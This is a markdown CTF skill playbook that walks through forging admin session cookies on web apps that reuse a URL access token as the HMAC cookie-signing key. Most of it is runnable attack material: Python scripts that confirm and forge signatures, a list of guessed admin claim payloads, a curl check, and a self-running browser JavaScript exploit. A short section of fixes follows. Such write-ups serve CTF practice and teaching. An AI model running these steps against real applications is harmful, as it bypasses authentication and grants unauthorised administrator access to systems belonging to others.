# Cookie HMAC Key Reuse → Admin Authentication Bypass

> When the server uses the access token exposed in the URL as the cookie signing key as well, and the admin side trusts the claim fields in the cookie payload directly, an administrator identity can be forged.

---

## When to use

- The target is a web application whose URL path contains parameters such as `access_token` / `token` / `key`
- The response headers set a signed cookie (such as `student_gate=<payload>.<signature>`)
- Several signed cookies (student side + admin side) may share one key
- The admin cookie payload contains client-controllable permission claims (such as `{"admin":true}`)

## Keywords

- HMAC key reuse / signing key reuse
- Known-key session forgery
- Client-side claims-based auth
- Cookie signature bypass

## Attack flow

### Step 1: Extract the access token from the URL

The entry URL usually shows:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe the student_gate cookie

Visit the entry; the response headers set a signed cookie. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm its structure.

### Step 3: Verify the signing algorithm

Use the known access token as the HMAC key and try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "token extracted from the URL"
payload_b64 = "payload part extracted from the cookie"
expected_sig = "signature part extracted from the cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("match" if computed == expected_sig else "no match")
```

If it matches → confirms that `the access token is the HMAC key`.

### Step 4: Guess the admin cookie name and payload structure

Common admin cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structure probing directions (try one by one until one returns 200):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge the admin cookie

```python
import hmac, hashlib, json, base64

access_token = "known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify admin permissions

```bash
curl -k -H "Cookie: <cookie from the previous step>" https://target/api/admin/me
```

It succeeds if it returns `{"admin":true}` or 200 + administrator data.

## Browser reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Fix

1. Sign cookies with an independent server-side key, not shared with the URL token
2. Base admin permissions on the server-side session, not on claims in the client cookie payload
3. Use different signing keys for different roles
4. Add and validate claims such as `iat` / `exp` / `typ` in the cookie
5. Handle signature parsing exceptions quietly (return 401 on failure, not 500)

## Related cases

- class.pangbaoba.me CTF range admin bypass (student_gate and admin_session shared the access token as the HMAC key, and `{"admin":true}` granted administrator rights directly)

## Related skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md`: web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md`: similar token claim confusion
- `reverse-engineering/languages-platforms.md`: JWT / OAuth related
